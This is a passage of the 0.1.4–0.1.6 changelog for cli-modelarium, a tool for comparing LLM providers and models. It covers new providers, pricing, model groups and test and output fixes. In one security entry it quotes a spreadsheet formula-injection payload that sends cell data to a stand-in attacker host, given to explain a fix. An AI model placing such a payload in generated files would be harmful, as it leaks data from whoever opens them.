- **`keys set google` and `configure` rejected every key Google now issues.** Google's Gemini keys have moved from the `AIza...` Standard format to an `AQ.Ab...` Auth format, and the API stops accepting Standard keys in September 2026. `KEY_PATTERNS["google"]` was `^[A-Za-z0-9_-]{30,}$` - never `AIza`-specific, just a shape floor - and the dot in the new prefix was the single character failing it, so a valid Auth key was refused with "Invalid API key format for google" and exit 2. The class now admits `.`, which is exactly the `zai` class already in the table with a stricter 30-character floor; an `AIza|AQ\.Ab` alternation was deliberately not used, since it would need the dot escaped and buys no strictness the floor does not already give. Checked exhaustively over printable ASCII: `.` is the only character the widening admits, and nothing that validated before stops validating.

  **Scope: this was the keychain path only.** `load_key` validates nothing, so an `AQ.Ab` key supplied through `GOOGLE_API_KEY` or `GEMINI_API_KEY` already worked, and headless and CI users were never affected. The provider client is unchanged - `GoogleProvider` hands the key to `genai.Client`, which sends it as an `x-goog-api-key` header, and that already worked with Auth keys. Verified end to end against a live Auth key: rejected before the change and accepted after, byte-identical through `save_key`/`load_key`, and a real `gemini-3.1-flash-lite` call succeeding on the key **as read back from the keychain** rather than from the environment.

  The pattern had no test in either direction before this - neither `test_valid_formats` nor `test_invalid_formats` carried a google case - which is how it came to reject a whole key format silently. Both shapes are now pinned as valid, along with the 30-character floor, out-of-class characters, and the fact that the widened class equals `zai`'s.

- **The README parity suite was reporting a pass it had not earned: two of the five static-group rows were never compared against `MODEL_GROUPS`, in any of the nine files.** `_table_rows` documents itself as taking a fragment that identifies a table **header**, and its `start + 2` exists to skip that header and the separator beneath it. Its only caller passed `` `all-premium` ``, which appears in a body row - so `next()` landed on the first body row and `start + 2` skipped that row and the one after it. `all-premium`/`all-flagship` and `all-budget` were dropped from every comparison, leaving only `all-reasoning`, `all-cheap` and `all-open-weight` ever checked: 18 of 45 row-by-file pairs unverified, for as long as the table has had `all-premium` in its first body row. Reading only `row[0].split("/")[0]` discarded the second alias as well, so `all-flagship` had no coverage even once its row was reached.

  A red build made it worse: `glm-5.2` belongs to three groups, so a single swap to `glm-5.3` leaves 27 stale README cells while CI reports 9 failures naming only `all-reasoning`, and correcting that one row turns the build green with `all-premium` still wrong in all nine files. `_table_rows` now matches its fragment against any line of the table and walks **back** to the separator row to find the body, so the offset no longer assumes what the match was. Anchoring on a header word is not available: every header is translated (`Group` is `Gruppe`, `Grupo`, `Groupe`, `Gruppo`, `グループ`, `그룹`, `组`), and the backticked identifiers in the body cells are the only translation-stable anchors these files have. The test now reads both aliases per cell and asserts that the documented groups equal `set(MODEL_GROUPS) - DYNAMIC_GROUPS`, replacing an `assert rows` non-emptiness check that stayed true while two of five rows were skipped. No README needed correcting - all nine documented the three groups correctly, confirmed cell by cell against `MODEL_GROUPS`, and the suite is unchanged at 1439 passed / 3 skipped.

- **`tests/test_cli_configure.py` no longer hangs where a controlling terminal is present.** `Prompt.ask(..., password=True)` reaches `getpass.getpass`, and on POSIX `unix_getpass` opens `/dev/tty` and reads from that, ignoring `sys.stdin`. All 35 tests pipe their answers through `CliRunner`, so wherever a terminal exists the first one blocks forever on a device nobody is typing into - after collection, with no output and no timeout of its own. CI is green because a runner has no controlling terminal: `/dev/tty` fails to open, `getpass` falls back to `sys.stdin`, and the piped answers arrive. A new autouse fixture in `tests/conftest.py` pins `getpass.getpass` to `getpass.fallback_getpass` so that fallback runs everywhere rather than only where the accident holds.

  **The fixture does not create a coverage gap; it makes an existing one deliberate.** CI has never exercised the `/dev/tty` path - there is no terminal to exercise it with - so that branch has been uncovered for as long as these tests have existed. Pinning the fallback costs nothing that was not already lost.

  **What stays uncovered is the transport, not the logic.** No test asserts that the prompt reads a terminal or suppresses echo, and after this change nothing in the suite can, by construction. What these tests were written for is untouched: the five counters and their partition, the panel title and border colour per outcome, and the `NoKeyringError`-breaks / `KeyringError`-continues split all still run, because they live in `configure`'s loop and in `_configure_summary`, not in the prompt.

  `fallback_getpass` warns `GetPassWarning` itself, so pinning to it guarantees the warning rather than removing it. The 35 this raises are left visible: they mark the fallback branch as active, and suppressing them would hide the one signal that the pin is in effect. The warning's origin line moves from `getpass.py` to `rich/console.py` because `fallback_getpass` is now called directly; that is cosmetic.

  **This is a test-only change; `src/` is untouched.** `configure` and `keys set` still read `/dev/tty`, so piping or redirecting a key into either still hangs wherever a terminal is present, and a key supplied on stdin is discarded. That is a separate defect, it predates this release, and it is not addressed here.

## [0.1.6] - 2026-08-15

### Added

- **NVIDIA NIM as an eleventh cloud provider, with nine models.** `NVIDIAProvider` is a thin `OpenAIProvider` subclass pointed at `https://integrate.api.nvidia.com/v1`, registered in `PROVIDER_REGISTRY` with a `KEY_PATTERNS` entry, so `keys set nvidia` / `keys delete nvidia` work and the key is read from `NVIDIA_API_KEY`. The nine: `google/gemma-4-31b-it`, `google/diffusiongemma-26b-a4b-it`, `nvidia/nemotron-3-ultra-550b-a55b`, `nvidia/llama-3.3-nemotron-super-49b-v1`, `nvidia/nemotron-mini-4b-instruct`, `mistralai/mistral-nemotron`, `minimaxai/minimax-m3`, `poolside/laguna-xs-2.1` and `meta/llama-3.1-8b-instruct`. Each was screened against all 83 chat entries in NVIDIA's catalog and then called live. Models already reachable through another provider are deliberately absent, as are any whose answer arrives only in `reasoning_content`, all multimodal ones (this tool sends no images), and one that measured 10.3s to first token against 0.2-0.9 for the rest.

- **Cost is not tracked for these nine models, and three guards silently do not apply to them.** NVIDIA publishes no per-token rate for hosted NIM - not in the API, the featured-models feed or the catalog, and independently confirmed against LiteLLM, which carries 3,020 priced entries and exactly three NIM rows, all rerank, all zero. Their `PRICING` rows carry `0.0` because that is what the schema forces, **not** because they are free.

  **`--max-cost` and `cost_under` provide no protection on this provider.** `--max-cost` compares against an estimate that is identically zero, so the gate never trips - even `--max-cost 0` proceeds. A `cost_under` assertion passes on any of these models regardless of the limit, so a CI job goes green on an assertion that never meaningfully ran. `--significance-metric cost_usd` should not be trusted while one of these models is in the comparison: its cost is a constant placeholder rather than a measurement, and a comparison against a real-cost arm can report a confident, fabricated result.

  **Access is credit-metered rather than per-token, so you exhaust credits rather than receive a bill.** That is a different failure mode from every other provider in the table, and it is the thing "cost is not tracked" fails to convey on its own.

  A caveat panel titled **Cost not tracked** carries all three points and fires on `compare` and `batch` whenever one of these models is in a run. It renders alongside the temperature caveat rather than replacing it, and goes to stderr when a machine payload owns stdout.

  **Known limitation: the cost column shows `$0.000000` for these models, which is not a price.** A later release will render it accurately. Three surfaces the panel does not reach: a NIM model used **only** as `--judge` is not in the run's model list, so no panel fires and judge cost sums silently to zero; `list-models` and `pricing --all` render `$0.0000` for these rows with no panel anywhere near them, and `pricing` is the command whose entire job is stating cost; and the **file output paths** - `--output results.md`, `.json` or `.csv` contain the rows with no caveat at all, because the panel is console text and never enters the file.

  **What that warning does and does not reach.** The sentence above reaches the human who sets a pipeline up, once. It does not reach the pipeline. A scripted consumer reads JSON, and the JSON carries no pricing caveat key: `total_cost_usd` reports `0` with nothing distinguishing it from a genuinely free run, and there is no top-level key marking which models were unpriced - unlike the temperature caveat, which has `models_without_temperature` and `significance_temperature_mixed`. Until a later release adds one, an automated consumer has no signal on any surface.

- NVIDIA models are in **no group**. They are excluded from the dynamic `all` group alongside `local` and `openrouter`, and from every static group. `all` otherwise means every model whose cost can be stated; the registry already holds four duplicate-weight pairs each neutralised only because OpenRouter is excluded, so NVIDIA would be the first provider able to put a genuine duplicate there; and a run exits `2` if any cell errors, while roughly half NVIDIA's catalog was unreachable when screened and availability moves between runs.
- The `KEY_PATTERNS` entry closes a split-brain before it can open. `configure` iterates `all_known_providers()` with no membership gate and `validate_key()` returns True for a provider with no pattern, while `keys set` and `keys delete` both gate on `KEY_PATTERNS` membership - so a provider present in `PRICING` and absent from `KEY_PATTERNS` would let `configure` write a credential that `keys delete` then refuses to remove. A test pins the invariant as a subset (every provider in `PRICING` except `local` must have a pattern) rather than an equality, so a provider can be wired before its models are registered.
- `tests/test_nvidia_provider.py`, following the per-provider file precedent set by `tests/test_zai_provider.py` rather than extending `tests/test_provider_inheritance.py`, whose three hand-maintained literal lists already omit `ZAIProvider` entirely.

### Changed

- **The nine READMEs document NVIDIA NIM.** The provider count is now eleven, the supported-providers table carries an NVIDIA NIM row reading **No published rate** under cost tracking, and the *Pricing data* section records that cost is not tracked and that `--max-cost` and `cost_under` give no protection there. Translated in place in all eight non-English files.

- **The project moved to SoraVantia GK.** The repository is now at [github.com/SoraVantia/cli-modelarium](https://github.com/SoraVantia/cli-modelarium), and the copyright holder in `LICENSE` and `NOTICE` is SoraVantia GK. Cli Modelarium was created by Lavelle Hatcher Jr, who continues to maintain it - `pyproject.toml` now records SoraVantia GK as `authors` and Lavelle Hatcher Jr as `maintainers`, and PyPI renders both.

  **Nothing about installing or using the tool changes.** The package is still `cli-modelarium` on PyPI, the command is still `cli-modelarium`, and the import path is still `cli_modelarium`. No code path, flag, output format or default changed.

  This is not a licence change. Cli Modelarium remains under Apache License 2.0; only the copyright holder moved. Third-party attributions in `NOTICE` are untouched.

  Repository links were updated across all nine READMEs, `CONTRIBUTING.md`, `SECURITY.md`, `pyproject.toml` and `.github/FUNDING.yml`. One is not documentation: the `HTTP-Referer` header the OpenRouter provider sends identifies the project by repository URL, and now carries the new one.

### Fixed

- **The privacy note now covers all three output formats.** It warned that JSON embeds the full prompt and the full model response and named `results.json` alone, which implied CSV and Markdown were safe to publish. All three carry the same content - CSV has `prompt`, `system`, `output` and `error` columns, and the Markdown report embeds both in full - and CSV is the likeliest of the three to be uploaded as a CI artifact. Corrected in all nine READMEs.

- **Repository URLs now use the lowercase repository name.** The repository is at [github.com/SoraVantia/cli-modelarium](https://github.com/SoraVantia/cli-modelarium), matching the PyPI package, the command and the import path; links written `Cli-Modelarium` were updated across the nine READMEs, `CONTRIBUTING.md`, `SECURITY.md`, `pyproject.toml`, this file and the OpenRouter `HTTP-Referer` header. The project name is unchanged - only the URL. `github.com` resolves case-insensitively, but `raw.githubusercontent.com` does not, and the two absolute asset URLs README.md carries are the ones PyPI renders.

- **The `all` group excludes NVIDIA, and all nine READMEs now say so.** They described `all` as excluding local models and OpenRouter; `_resolve_all_cloud` excludes local, OpenRouter and NVIDIA. A user who configured `NVIDIA_API_KEY` and ran `--models all` got no NIM models and no explanation. The sentence now names all three and gives the reason in a clause.

- **The eight translations documented manual re-running instead of `--runs`.** They carried the pre-`--runs` advice to run the same comparison three to five times and look for patterns - wrong advice rather than missing advice, since the flag has done it automatically for several releases. Both bullets README.md documents it in are now translated, along with the coefficient-of-variation threshold, the `stats_by_cell` JSON key and the `--runs` plus `--check-hallucination` combination. `System requirements` is also translated rather than left English-only, so the note naming seven English-only sections is now accurate. `tests/test_readme_parity.py` pins all of it: the provider count, the temperature model list, every static group row, the date set and the heading structure are asserted against the registry across all nine files, so a fact can no longer drift in documentation while the code moves.

- **The READMEs now list every provider's environment variable and name the correct set of models that omit temperature.** The headless-Linux export block carried nine variables for eleven cloud providers - `ZAI_API_KEY` had been missing since Z.AI landed in 0.1.4 - and the comparison-methodology section listed nine models as omitting the temperature field when the registry has twelve, the three `gpt-5.6` variants added in 0.1.5 having gone unrecorded.

### Security

- `redact_secrets()` now removes `nvapi-` prefixed tokens. The `Authorization: Bearer`, `x-api-key:` and `api_key=` rules already caught it, because those match on the surrounding marker rather than on the key's shape, but a bare token quoted in a JSON error body carries no marker and nothing matched it. Redacted provider errors reach the `error` column of both CSV and JSON output, which CI pipelines commonly upload as an artifact, so the gap ended at a file people publish.

  **Scope, stated precisely: this was not reachable at 0.1.5.** Nothing read `NVIDIA_API_KEY` - every `load_key()` and `is_key_configured()` call site is driven by `all_known_providers()`, which derives from `PRICING`, and no NVIDIA model was registered - so no `nvapi-` token could enter an error string through the tool. The gap was in the redaction table, not in a live path. It is fixed in the same release that makes it reachable, not after. The seven pre-existing prefix rules are unaffected and are now pinned to their exact output by a regression test, so a future pattern addition cannot silently swallow one into the wrong placeholder.

### Dependencies

- Widened `mistralai` from `>=2.4.7,<2.9.0` to `>=2.4.7,<2.10.0`. The 2.8 line is terminal - 2.8.0 was its only release - and this SDK ships forward-only generated releases without backports, so an upstream security patch would land at 2.9 or above and the old ceiling would have kept it from reaching users. 2.9.3 was run against the full suite. The floor stays at `2.4.7`: it excludes the withdrawn 2.4.6 release (GHSA-wx9m-wx4f-4cmg).
- Declared `numpy>=1.17` explicitly. It was already installed as a transitive dependency of `scipy`, but `run_statistics.py` imports it directly, so the import now rests on a declaration rather than on another package's requirements. The floor is what the code uses: `numpy.random.default_rng` and `Generator.integers` arrived in 1.17.0. No ceiling - no numpy release has broken this project.

## [0.1.5] - 2026-08-07

### Breaking

- **Removed the `all-fast` model group.** `--models all-fast` is no longer a group name; it now gives the same `Unknown model: all-fast` error as any unrecognised token. The seven models it contained are untouched - all remain in `PRICING` and can still be named individually - and no other group changed membership.

  The reason is that the selection could not be defended. The seven were a curated one-model-per-provider pick, and this project has never measured latency, so the members were not chosen on any figure it can cite. Ranking each member against the other models from its own provider (blended input + output rate) shows the membership does not track price either: `claude-haiku-4-5` 1/10 and `deepseek-v4-flash` 1/2 are their provider's cheapest, but `glm-5-turbo` is 10th of 14, `gemini-3.5-flash` 5th of 6, and `llama-3.3-70b-versatile` is the **dearest** of Groq's four. Nor was the group simply "every model named fast": eight registered provider ids contain `flash`, `turbo`, `fast` or `instant` and were not in it, among them `gemini-2.5-flash`, `gemini-3.6-flash`, `glm-4.7-flash`, `glm-4.5-flash` and `qwen-flash`. Naming broke ties; it was not the rule. A group asserting a property the project cannot support is worse than no group, so it is withdrawn rather than redefined.

  Removed outright rather than deprecated behind a warning. `RETIRED_MODELS` exists to prevent silent *substitution* - a retired id resolving to something else and billing at a different rate while the run appears to succeed - and there is no substitution risk here: the token stops resolving before any request is built. Nothing was added to `RETIRED_MODELS`; a group was withdrawn, not a model retired.

  **What replaces it.** There is no drop-in group. The closest surviving group is `all-budget`, but it is not equivalent: it covers six of the seven providers, **drops Groq**, and **requires `OPENAI_API_KEY` and `MISTRAL_API_KEY` that `all-fast` did not** - so a user with exactly the keys `all-fast` needed gets `No API key configured for openai`. If you want what `all-fast` ran, name the models directly: `--models claude-haiku-4-5,gemini-3.5-flash,grok-4.20-0309-non-reasoning,deepseek-v4-flash,llama-3.3-70b-versatile,qwen3.6-flash,glm-5-turbo`.

  **What you will see.** If your run previously failed for a missing key, the exit code is unchanged at `2` and only the message differs - the group aborted on the first missing credential before, and the token is unrecognised now. If your run previously **worked**, it now exits `2` where it exited `0`, so a script gating on a non-zero status fails immediately rather than silently. Note that a shell redirect such as `--output-format json > results.json` still creates the file, so a pipeline that uploads that artifact will publish an empty one.

### Added

- `RetiredModelError` and a `RETIRED_MODELS` map for model IDs a provider has retired. Resolution now fails with a message naming the suggested replacement and the retirement date, and never substitutes the replacement: silent substitution is the failure mode this prevents (xAI, for example, redirects retired slugs to `grok-4.3` and bills at `grok-4.3` rates, so a request appears to succeed while the reported cost is wrong by ~6x). The check sits in `get_provider_for_model()`, the single chokepoint every comparison, batch run and judge validation routes through before any request is built, and is repeated in the `pricing <model>` command, which reads `PRICING` directly.
- `gpt-5.6-sol` (5.00 / 30.00 / 0.50), `gpt-5.6-terra` (2.00 / 12.00 / 0.20) and `gpt-5.6-luna` (0.20 / 1.20 / 0.02), OpenAI's current line. All three carry `rejects_sampling_params` - each returns `400 Unsupported value: 'temperature' does not support 0 with this model. Only the default (1) value is supported.`, so without the flag every call would fail, exactly as the nine models in Fixed below did. `gpt-5.6-terra` is OpenAI's named replacement for `o4-mini`, which shuts down 2026-10-23 with its bare alias attached; `o4-mini` still works until then and is unchanged, as is its group membership. Prices are the standard short-context column - all three have a long-context tier above 272K, and `gpt-5.6-sol` doubles to 10.00 / 45.00 there. Verified 2026-08-07 by live call, one day after `PRICING_AS_OF`; the constant is deliberately not moved, since the rest of the registry was not re-verified on that date.
- `gemini-3.6-flash` (1.50 / 7.50 / 0.15), Google's recommended replacement for the removed `gemini-3-flash`.
- `claude-opus-5` (5.00 / 25.00 / 0.50) and `claude-sonnet-5` (3.00 / 15.00 / 0.30). Sonnet 5 stores Anthropic's list price; introductory pricing of 2.00 / 10.00 runs through 2026-08-31, with list pricing effective 2026-09-01.
- Cache-read rate for `gpt-5.3-codex` (0.175), which was missing.
- A group-membership invariant test: every member of every static group must be a live `PRICING` entry and must not be provider-retired. No test pinned group membership before now, which is why the dead `deepseek-reasoner` entry in `all-reasoning` survived a green suite.
- `tests/test_deepseek_provider.py`, covering provider identity, routing, cost, and that `_extra_create_kwargs()` stays an empty dict so no thinking-toggle reaches the wire.
- Dated deprecation comments next to `o4-mini`, `o3`, `o3-pro`, `gemini-2.5-flash`, `gemini-2.5-flash-lite` and `claude-haiku-4-5`, so the deadlines live in the code. No pricing or behavior change.
- A per-model `rejects_sampling_params` flag in `PRICING`, read through a new `rejects_sampling_params(model)` helper. Nine entries carry it - `gpt-5`, `gpt-5.5`, `o3`, `o4-mini`, `claude-opus-4-7`, `claude-opus-4-8`, `claude-opus-5`, `claude-sonnet-5` and `claude-fable-5` - and for those the Anthropic and OpenAI-compatible request builders omit `temperature` entirely. The direction of the default is deliberate: **absent means send.** Every other registry entry, every `local/` id, every OpenRouter passthrough id and every model added in future keeps receiving `temperature`. A newly-restricted model added without the flag therefore fails loudly with a 400 that names the parameter; under the opposite default it would quietly lose `temperature` with no error and nothing in the suite to catch it.
- `JudgeResult.degraded_models`, recording judges that ran at the provider default because they reject a temperature setting. Judging asks for `0.0` as before, but a flagged judge cannot honour it, so its scores are not reproducible run to run. The caveat is surfaced on all three output surfaces: a console note under the comparison table, a `(degraded: ...)` suffix on the Markdown Score cell, and a `judge_degraded` list per result in JSON.
- A `Temperature not applied` warning when a multi-value `--temperatures` sweep includes a model that omits the field, on both `compare` and `batch`. Every run of that model is an identical request rather than a sweep. It fires after group expansion, so it also covers the case where the user never typed the affected id - `--models all-premium --temperatures 0,0.5,1` names it explicitly.
- A mixed-sampling caveat on `compare`, for a significance run that compares a model which omits `temperature` against one that honours it. The two groups are sampled under different conditions, so the p-value can be reporting that rather than model quality. It fires whenever a verdict will actually be computed - including on the default invocation, `--models a,b --runs 10`, where `--significance` was never typed and auto-enables. That was the gap: the existing sweep warning covers only multi-value `--temperatures`, so the single-temperature case produced a statistical verdict with no signal anywhere. Where both caveats apply, they are **merged into one panel** carrying both messages rather than either suppressing the other; the sweep warning is unchanged everywhere it fires today. `batch` is unaffected - it has no `--runs` and no `--significance`, so it never computes a verdict to caveat.
- A top-level `significance_temperature_mixed` boolean in JSON output, the machine-readable half of that caveat: a script reading `--output-format json` otherwise gets a p-value with no indication the samples were incomparable. Like `models_without_temperature` it is always present, top level (**not** in the `methodology` block, which is gated on `--runs > 1`), and it is `false` from `batch`, which cannot mix a verdict. `CSV_COLUMNS` is unchanged.
- A top-level `models_without_temperature` key in JSON output, listing the models in that run whose `temperature` was omitted. Top level, **not** inside the `methodology` block, which is emitted only when `--runs > 1`. The key is always present and is an empty list when no such model ran. **CSV output carries no equivalent signal:** its `temperature` column records the value requested, not the value applied, and `CSV_COLUMNS` is unchanged this release.

### Changed

- Corrected `mistral-small-latest` to 0.15 / 0.60. The alias now resolves to Mistral Small 4; the previous 0.10 / 0.30 understated cost in both `all-budget` and `all-cheap`.
- `all-reasoning` now uses `deepseek-v4-pro` in place of the retired `deepseek-reasoner`. DeepSeek exposes reasoning as a mode rather than a separate model; Pro is the stronger of the two V4 models and Flash already fills the DeepSeek slot in `all-budget`, `all-fast` and `all-cheap`. Synced the group table across the README and all 8 translations.
- Re-verified provider pricing against first-party pages (2026-07-29) and bumped `PRICING_AS_OF` to 2026-07-29. One exception: the Z.AI/GLM block was not part of that pass and keeps its own earlier `2026-06-22` verification date in `pricing.py`; its 14 entries are unchanged since then.
- `all-open-weight` now uses the Groq-served `openai/gpt-oss-120b` and `openai/gpt-oss-safeguard-20b` in place of the removed `gpt-oss-120b` and `gpt-oss-20b`. The group keeps four members and every one of them is callable. **This changes which credential the group needs:** the removed entries were openai-provider, the replacements are groq-provider, so `--models all-open-weight` now requires `GROQ_API_KEY` for two slots that previously used `OPENAI_API_KEY`. Synced the group table across the README and all 8 translations.
- The module docstring and the eight per-provider section comments in `pricing.py` still read "Verified 2026-06-22" after `PRICING_AS_OF` was bumped. The docstring and those eight now read 2026-07-29; the ninth section comment, Z.AI's, keeps its own earlier date by design - see the note beside it in `pricing.py`.

### Removed

- `deepseek-chat` and `deepseek-reasoner`, retired by DeepSeek on 2026-07-24. Both are in `RETIRED_MODELS`.
- `grok-4.1-fast`, retired by xAI on 2026-05-15 and absent from its current pricing page. In `RETIRED_MODELS`.
- `mistral-medium-3.5`, a duplicate of `mistral-medium-latest` at the same price and not an ID Mistral documents. Deliberately not in `RETIRED_MODELS` - it was never provider-retired, so "Unknown model" is the accurate error.
- `gemini-3-flash`, whose ID and price were both wrong (the real ID is `gemini-3-flash-preview`; the stored 0.30 / 2.50 was `gemini-2.5-flash`'s rate). Also not in `RETIRED_MODELS`, for the same reason.
- `get_pricing()` from `pricing.py`, along with a dead branch in the judge Score-column renderer. It had no callers in `src/` and, unlike every live resolution path, did not check `RETIRED_MODELS` - a retired ID returned `None` rather than raising. It was never exported in `__init__.py`, but `from cli_modelarium.pricing import get_pricing` no longer resolves.
- `gpt-5.5-pro`, `gpt-5.4-pro`, `gpt-5.3-codex`, `gpt-5.3-codex-spark`, `gpt-oss-120b` and `gpt-oss-20b`, none of which are callable on the chat-completions endpoint this tool uses. Some are Responses-API-only; the rest were registered under ids this tool cannot call on that endpoint. Deliberately **not** in `RETIRED_MODELS`, for the same reason as `mistral-medium-3.5` and `gemini-3-flash` above: none was retired by its provider, so "Unknown model" is the accurate error and a retirement message naming a replacement would be false. Note that `gpt-5.3-codex` gained a cache-read rate earlier in this same release; correcting a price and then removing the entry in one release is deliberate - the rate was wrong and the model was never reachable - not thrash.

### Fixed

- Nine models could not be called at all. Any request carrying a non-default `temperature` came back 400, and `compare`/`batch` always send one, so `claude-opus-5`, `claude-sonnet-5`, `claude-opus-4-8`, `claude-opus-4-7`, `claude-fable-5`, `gpt-5`, `gpt-5.5`, `o3` and `o4-mini` failed every time - including as judges, and including through the `all`, `all-premium` and `all-flagship` groups. Omitting the field is the documented way to call them, and that is what now happens.
- **Exit codes on existing CI pipelines will move as a result.** A batch suite whose assertions could not run because the model returned 400 exits `2` today; from this release those assertions actually execute and the suite exits `0` or `1` on their real outcome. A previously-red pipeline may go green, or may fail on assertions for the first time. That is the intended fix, but a green-to-red flip reads like a regression to anyone who has not read this note.
- Worth knowing where the caveat bites hardest: `--significance` is the one place it can change a *conclusion* rather than a label. Comparing a model that omits `temperature` against one that honours it produces a variance difference that is a sampling artifact, and Welch or Mann-Whitney will report it as though it were a model-quality difference. That case now has a signal on both surfaces - see the mixed-sampling caveat below - where previously it had none, because the sweep warning fires only on multi-temperature runs and the dangerous invocation is the single-temperature default.
- **Human output no longer shares stdout with a machine payload.** `--output-format json|csv` writes to stdout, but so did the progress bar, the `Running batch:` line, the run summary, the judge ToS panel and six other sites - none of them gated on the output format. JSON raised on the extra bytes; CSV was worse, because `csv.reader` silently read a contaminating line as the header (one column instead of 21) or as an extra data row, and raised nothing. `compare` was affected too, not only `batch`: `--judge` prints the ToS panel unless `--no-judge-tos` is passed, so the default judging path corrupted the payload at any terminal width. Fixed as a scope rule rather than a list of sites - when there is no `--output` file and the format is `json` or `csv`, the command binds a stderr console for its whole body, so every site inherits it, including any added later. Two earlier attempts at this enumerated the sites and missed some both times. **The progress output is moved, not suppressed:** it is still there on stderr for anyone watching a long batch run.
- **Rich no longer reflows the serialized payload.** The JSON and CSV stdout branches went through `console.print()`, which wraps at the terminal width - so any response longer than the terminal corrupted the payload, and `jq` failed with `Invalid string: control characters from U+0000 through U+001F must be escaped`. This passed on a wide developer terminal and failed at the 80 columns CI defaults to. The payload is now written straight to `sys.stdout.buffer` as UTF-8, bypassing Rich entirely: wrapping is only one of three ways it mutates a payload, alongside consuming square-bracket markup and colouring numbers and URLs. Writing bytes rather than text also keeps the stdout stream byte-identical to the `--output` file on Windows, where text mode would translate the line endings.

These two were independent: fixing either one left the other. `--output FILE` was never affected and is unchanged.

**Behaviour change for existing scripts.** Anyone working around the old output - stripping the first two lines before parsing, say - will now strip two lines of valid payload. The workaround should be removed rather than kept.

### Security

- **CSV formula injection.** A cell whose value began with `=`, `+`, `-`, `@`, tab, carriage return or line feed was written verbatim, and spreadsheet applications evaluate such a cell as a formula rather than reading it as text. A model response of `=HYPERLINK("http://evil.example/?d="&A2,"Click")` therefore became a live exfiltration link the moment `results.csv` was opened in Excel, Google Sheets or LibreOffice. Reachable two ways: through model output, which is the least controlled content in the system, and through the batch file's `id` field, which becomes the `prompt_id` column and needs no model cooperation at all. All six text columns were affected - `prompt_id`, `prompt`, `system`, `model`, `output`, `error` - and `prompt_id` and `model` had never passed through any escaping helper. Values beginning with one of the seven characters are now prefixed with an apostrophe, which spreadsheets treat as a text marker. The escaping sits at the field-write boundary inside `_format_csv`, so it covers every column including any added later, and JSON and Markdown are deliberately untouched: JSON has no formula-injection problem and Markdown needs a different mitigation. Full-width variants (`＝` `＋` `－` `＠`), which OWASP notes are interpretable as formulas in some locales, are **not** covered.
- The transform is not perfectly invertible. A value that legitimately begins with an apostrophe is indistinguishable from an escaped one, so a consumer that strips a leading apostrophe unconditionally will corrupt it.
- **`prompt_id` now differs between CSV and JSON.** Because the escaping lives inside the CSV formatter and JSON is deliberately left alone, a `prompt_id` beginning with one of the seven characters reads as `-baseline` in JSON and `'-baseline` in CSV. `prompt_id` is the natural join key - it is user-chosen through the batch file's `id`, uniqueness is enforced, and the README's own examples use semantic ids like `math-1` - so a consumer correlating the two formats, or joining a CSV back to its source batch file, would silently fail to match. It only bites when an id begins with one of the seven characters, and `-baseline` is not exotic.

### Dependencies

- Widened `mistralai` from `~=2.4.7` to `>=2.4.7,<2.9.0`, so the 2.5 through 2.8 minor series are allowed and an upstream security patch can be received without an emergency release. The floor stays at `2.4.7` deliberately: it excludes the compromised 2.4.6 release (GHSA-wx9m-wx4f-4cmg), and 2.4.7 is also the first mistralai release carrying signed publish attestations. All fifteen versions in the new range were run against the full suite.
- Tightened the `ruff` dev constraint from `~=0.15` to `~=0.16.0`. This is a ceiling tightening as much as an upgrade: two-component `~=0.15` allowed anything below `1.0`, while three-component `~=0.16.0` means `<0.17`.

## [0.1.4] - 2026-06-22

### Added

- DashScope (Alibaba Model Studio, International/Singapore endpoint) provider with 6 Qwen models (qwen3.7-max, qwen3.7-plus, qwen3.6-flash, qwen3.6-plus, qwen-flash, qwen3-coder-plus). Uses `DASHSCOPE_API_KEY`. Sends `enable_thinking=false` so costs reflect non-thinking rates. Added an `_extra_create_kwargs()` hook to the OpenAI-compatible base (default no-op) to support this.
- `--models all` now resolves to every cloud model with a configured API key (excludes local and OpenRouter); `--models all-local` resolves to the models reported by a running local server, with a clear message when none is reachable. Previously these tokens errored with "Unknown model."
- Documented the model-group shortcuts (static groups + `all`/`all-local`) in the README.
- Added Python 3.14 to the tested CI matrix (the 3.14 classifier was already declared; CI now exercises it). Minimum supported version remains 3.11.
- Z.AI/GLM provider (Zhipu AI, OpenAI-compatible overseas endpoint) with 14 GLM text models (glm-5.2, glm-5.1, glm-5, glm-5-turbo, glm-4.7, glm-4.7-flash, glm-4.7-flashx, glm-4.6, glm-4.5, glm-4.5-air, glm-4.5-x, glm-4.5-airx, glm-4.5-flash, glm-4-32b-0414-128k), including the free glm-4.7-flash / glm-4.5-flash. Uses `ZAI_API_KEY`; reuses the existing OpenAI-compatible stack (no new dependency).
- Current Claude models: claude-fable-5 (new frontier tier), claude-opus-4-8 (recommended Opus flagship), claude-opus-4-5, claude-sonnet-4-5. The `all-premium` / `all-flagship` groups now point at claude-opus-4-8.
- Added Z.AI/GLM and Alibaba/Qwen models to the static model groups: `all-premium`/`all-flagship` (qwen3.7-max, glm-5.2), `all-budget` (qwen3.7-plus, glm-4.5-air), `all-fast` (qwen3.6-flash, glm-5-turbo), `all-cheap` (qwen-flash, glm-4.7-flashx), and glm-5.2 in `all-reasoning`. Qwen is intentionally excluded from `all-reasoning`: the DashScope provider sends `enable_thinking=false`, so a Qwen model there would run non-thinking; glm-5.2 reasons by default through the Z.AI provider.

### Changed

- Corrected pricing to first-party provider rates (OpenAI o3/o3-pro/gpt-5.4-pro + cached rates; Google Gemini flash/flash-lite; Mistral medium/small; Groq gpt-oss/llama-4-scout; DeepSeek v4-pro/v4-flash/chat/reasoner).
- Corrected `gemini-3.1-pro` pricing to first-party rates (2.00/12.00/0.20) and renamed it to `gemini-3.1-pro-preview` to match the live API model id (the Gemini provider sends the id verbatim).
- Corrected `grok-4.20` and `grok-4.20-multi-agent` pricing to first-party rates (1.25/2.50) and updated their model ids to the live dated strings (`grok-4.20-0309-non-reasoning`, `grok-4.20-multi-agent-0309`).
- Repaired static model groups: replaced retired `grok-4.1-fast` (all-budget/all-fast) with `grok-4.20-0309-non-reasoning` and removed it from all-cheap; replaced `gemini-3-flash` with `gemini-3.5-flash` in all-fast. (`deepseek-reasoner` in all-reasoning is intentionally retained this release; its swap to a confirmed thinking-capable v4 id is deferred pending a live check before its 2026-07-24 deprecation.)
- Added OpenAI cache-read rates (`gpt-5`, `gpt-4.1-mini`, `gpt-4o`, `gpt-4o-mini`).
- Synced the README and all 8 translations to the current model groups, provider list, and pricing date; tightened the local-server ("running on localhost") and per-call model-selection feature descriptions for accuracy.
- Re-verified all provider pricing against first-party pages (2026-06-22). Bumped `PRICING_AS_OF` to 2026-06-22.

### Fixed

- The Google provider now also accepts `GEMINI_API_KEY` (the documented alias was previously ignored; only `GOOGLE_API_KEY` was read). `GOOGLE_API_KEY` still takes precedence.

